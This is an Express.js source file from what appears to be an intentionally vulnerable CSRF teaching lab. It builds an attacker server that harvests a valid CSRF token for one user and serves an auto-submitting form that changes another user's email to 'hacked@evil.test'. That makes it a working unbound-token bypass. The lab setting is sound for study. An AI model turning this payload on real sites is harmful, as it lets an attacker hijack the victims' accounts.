// INTENTIONALLY VULNERABLE. For learning only. Never use in a real app.

const express = require('express');
const path = require('path');
const { AttackerClient } = require('./attackerClient');

/**
 * Creates the attacker Express application hosting attack scripts and bypass payloads.
 *
 * @param {object} options
 * @param {string} [options.victimUrl='http://localhost:5001'] URL of the target victim application
 * @returns {express.Application}
 */
function createAttackerApp(options = {}) {
  const victimUrl = options.victimUrl || 'http://localhost:5001';
  const app = express();

  // Dynamic route for Demo 1: Unbound Token Bypass
  // Attacker server logs in as Mallory, obtains her valid token,
  // and injects it into an auto-submitting form targeting Alice.
  app.get('/attack-unbound-token.html', async (req, res) => {
    try {
      const client = new AttackerClient(victimUrl);
      const { token } = await client.acquireMalloryToken();

      const html = `<!-- INTENTIONALLY VULNERABLE. For learning only. Never use in a real app. -->
<!--
  BYPASS DEMO 1: UNBOUND TOKEN ATTACK
  Attacker harvested token: ${token || 'NONE'}
  When this form submits to ${victimUrl}/api/change-email, Alice's browser supplies her session cookie,
  while the form supplies Mallory's token. In weak-token mode, this bypass succeeds.
-->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Executing CSRF Bypass: Unbound Token</title>
  </head>
  <body>
    <h2>Submitting change-email with Mallory's token...</h2>
    <form id="csrf-form" action="${victimUrl}/api/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@evil.test">
      <input type="hidden" name="_csrf" value="${token || ''}">
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>`;
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.send(html);
    } catch (err) {
      res.status(500).send(`Error harvesting attacker token: ${err.message}`);
    }
  });

  // Serve static attack pages (basic change-email, transfer, no-referrer, index)
  app.use(express.static(path.join(__dirname, 'pages')));

  return app;
}

// If executed directly as a script
if (require.main === module) {
  const { loadConfig } = require('../src/config');
  const config = loadConfig();
  const app = createAttackerApp({
    victimUrl: `http://localhost:${config.victimPort}`,
  });
  const HOST = '127.0.0.1'; // Listen strictly on loopback interface

  app.listen(config.attackerPort, HOST, () => {
    console.log(`Attacker website running at http://127.0.0.1:${config.attackerPort}`);
  });
}

module.exports = {
  createAttackerApp,
};
